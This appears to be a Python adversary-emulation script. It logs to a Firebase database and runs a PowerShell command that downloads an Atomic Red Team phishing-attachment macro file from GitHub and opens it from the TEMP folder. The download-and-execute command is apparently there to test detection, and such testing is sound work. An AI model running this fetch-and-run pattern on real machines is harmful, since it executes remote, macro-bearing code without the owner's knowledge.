import os
import subprocess
import firebase_admin
from firebase_admin import credentials, db
from datetime import datetime

# Get the directory of the current script
current_dir = os.path.dirname(os.path.abspath(__file__))

# Initialize Firebase
cred = credentials.Certificate(os.path.join(current_dir, 'CREDENTIAL FILE NAME HERE'))
firebase_admin.initialize_app(cred, {
    'databaseURL': 'https://cyberlog-6eb66-default-rtdb.europe-west1.firebasedatabase.app'
})


def log_to_firebase(event_message):
    ref = db.reference('logs')
    ref.push({
        'timestamp': datetime.utcnow().isoformat(),
        'event': event_message
    })


def main():
    try:
        # Log the start of the script execution
        log_to_firebase('Phishing attack script started')

        # Define the PowerShell command
        powershell_command = """
        $url = 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1566.001/bin/PhishingAttachment.xlsm'
        $output = [System.IO.Path]::Combine($env:TEMP, 'PhishingAttachment.xlsm')
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        Invoke-WebRequest -Uri $url -OutFile $output
        Start-Process $output
        """

        # Execute the PowerShell command
        subprocess.run(["powershell", "-Command", powershell_command], check=True)

        # Log the successful execution of the PowerShell command
        log_to_firebase('PowerShell command executed successfully: Downloaded PhishingAttachment.xlsm')

    except subprocess.CalledProcessError as e:
        log_to_firebase(f'Error executing PowerShell command: {e}')

    except Exception as e:
        log_to_firebase(f'An error occurred: {e}')


if __name__ == '__main__':
    main()
